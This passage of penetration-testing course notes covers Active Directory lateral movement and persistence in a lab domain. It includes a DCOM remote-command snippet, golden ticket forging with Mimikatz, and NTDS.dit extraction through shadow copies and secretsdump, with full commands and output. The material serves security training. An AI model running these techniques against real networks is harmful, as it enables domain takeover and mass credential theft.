+ Next, we'll discover how to maintain access on the target network through persistence techniques.

Full script:
``` PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("<COMMAND>",$null,"<PARAMS>","7")
```

## Active Directory Persistence
Once an adversary has obtained access to a single or multiple hosts, they would like to maintain access to extend the operation time span
+ This means that the attacker's access to the target network has to carry on after a reboot or even a credential change
+ MITRE defines the persistence tactic as a set of techniques aimed to maintain an attacker's foothold on the target network

We can use traditional persistence methods in an Active Directory environment, but we can also gain AD-specific persistence as well
+ Note that in many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete
+ We are going to explore how golden ticket and shadow copy techniques can be misused to retain access

### Golden Ticket 
Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain
+ This secret key is actually the password hash of a domain user account called _krbtgt_ 
+ If we are able to get our hands on the _krbtgt_ password hash, we could create our own self-made custom TGTs, also known as _golden tickets_ 

Although this technique's name resembles the Silver Ticket one that we encountered in the Attacking Authentication Module, Golden Tickets provide a more powerful attack vector
+ While Silver Tickets aim to forge a TGS ticket to access a _specific_ service, Golden Tickets give us permission to access the _entire_ domain's resources, as we'll see shortly
+ For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted
+ We must carefully protect stolen _krbtgt_ password hashes because they grant unlimited domain access
	+ Consider explicitly obtaining the client's permission before executing this technique

This provides a neat way of keeping persistence in an Active Directory environment, but the best advantage is that the _krbtgt_ account password is not automatically changed
+ In fact, this password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version
+ Because of this, it is not uncommon to find very old _krbtgt_ password hashes
+ The _Domain Functional Level_ dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller
	+ Higher functional levels enable additional features, functionality, and security mitigation's

To test this persistence technique, we will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the _jen_ user by spawning a traditional command shell with the _cmd_ command
+ This should fail because we do not have the proper permissions
``` PowerShell
C:\Tools\SysinternalsSuite>PsExec64.exe \\DC1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access DC1:
Access is denied.
```

At this stage of the engagement, the golden ticket will require us to have access to a **Domain Admin**'s group account or to have **compromised the domain controller** itself in order to work as a persistence method
+ With this kind of access, we can extract the password hash of the _krbtgt_ account with Mimikatz 
+ To simulate this, we'll log in to the domain controller via remote desktop using the _jeffadmin_ account, run Mimikatz from **`C:\Tools`**, and issue the **`lsadump::lsa`** command as displayed below:
+ Usage:
```
lsadump::lsa /patch
```
+ Example
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
```

Having obtained the NTLM hash of the _krbtgt_ account, along with the domain SID, we can now forge and inject our golden ticket
+ Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain
+ We'll take the hash and continue the procedure from a compromised workstation

Back on CLIENT74 as the _jen_ user, before generating the golden ticket, we'll launch mimikatz and delete any existing Kerberos tickets with **kerberos::purge**:
```
kerberos::purge
```

We'll supply the domain SID (which we can gather with **whoami /user**) to the Mimikatz **kerberos::golden** command to create the golden ticket
+ This time, we'll use the **/krbtgt** option instead of **/rc4** to indicate we are supplying the password hash of the _krbtgt_ user account
+ Starting July 2022, we'll need to provide an existing account, so let's set the golden ticket's username to **jen**
```
kerberos::golden /user:<EXISTING_USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```
+ Example:
```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
```

Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID 
+ The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group
+ With the golden ticket injected into memory, we've launched a new command prompt with **misc::cmd** from which we again attempt lateral movement with **PsExec**:
```
misc:cmd
```
+ Example:
```
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
   IPv4 Address. . . . . . . . . . . : 192.168.50.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes    
=========================================== ================ ============================================ ===============================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                      Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
CORP\Domain Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
CORP\Group Policy Creator Owners            Group            S-1-5-21-1987370270-658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
CORP\Schema Admins                          Group            S-1-5-21-1987370270-658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
CORP\Enterprise Admins                      Group            S-1-5-21-1987370270-658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
CORP\Denied RODC Password Replication Group Alias            S-1-5-21-1987370270-658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\High Mandatory Level        Label            S-1-16-12288   
```

We have an interactive command prompt on the domain controller and notice that the **whoami** command reports us to be the user _jen_, which is now part of the Domain Admin group
+ Listing group memberships shows that we are now a member of multiple powerful groups including the Domain Admins group

Note that by creating our own TGT and then using PsExec, we are performing the _overpass the hash_ attack by leveraging Kerberos authentication as we discussed earlier in this Module
+ If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows
```
C:\Tools\SysinternalsSuite> psexec.exe \\192.168.50.70 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.50.70:
Access is denied.
```

In this section, we have demonstrated the golden ticket technique as a persistence mechanism
+ By obtaining the NTLM hash of the _krbtgt_ user, we can issue domain-administrative TGTs to any existing low-privileged account and thus, obtain inconspicuous legitimate access to the entire AD domain

### Shadow Copies
A _Shadow Copy_, also known as _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes
+ To manage volume shadow copies, the Microsoft signed binary _vshadow.exe_ is offered as part of the Windows SDK

As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database **NTDS.dit** database file
+ Once we've obtained a copy of said database, we can extract every user credential offline on our local Kali machine

To start off, we'll connect as the _jeffadmin_ domain admin user to the DC1 domain controller and launch from an elevated prompt the **vshadow** utility with **-nw** options to disable writers, which speeds up backup creation and include the **-p** option to store the copy on disk:
```
vshadow.exe -nw -p  C:
```
+ Example output:
```
VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
```

Once the snapshot has been taken successfully, we should take note of the shadow copy device name
+ We'll now copy the whole AD Database from the shadow copy to the **C:** drive root folder by specifying the shadow copy device name and append the full **ntds.dit** path:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
+ As a last ingredient, to correctly extract the content of **ntds.dit**, we need to save the SYSTEM hive from the Windows registry
+ We can accomplish this with the **reg** utility and the **save** argument
```
reg.exe save hklm\system c:\system.bak
```

Once the two **.bak** files are moved to our Kali machine, we can continue extracting the credential materials with the _secretsdump_ tool from the impacket suite
+ We'll supply the ntds database and the system hive via **-ntds** and **-system**, respectively along with the **LOCAL** keyword to parse the files locally
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
+ Example:
```
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
```
+ We managed to obtain NTLM hashes and Kerberos keys for every AD user, which can now be further cracked or used as-is through pass-the-hash attacks

While these methods might work fine, they leave an access trail and may require us to upload tools
+ An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation
+ To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module, which can be misused as a less conspicuous persistence technique
+ Although most penetration tests wouldn't require us to be covert, we should always evaluate a given technique's stealthiness, which could be useful during future red-teaming engagements

In this Learning Unit, we explored a few Windows Active Directory persistence techniques that could be employed during penetration testing or red-teaming exercises whose rules of engagement mandate we retain long-term access to the compromised environment


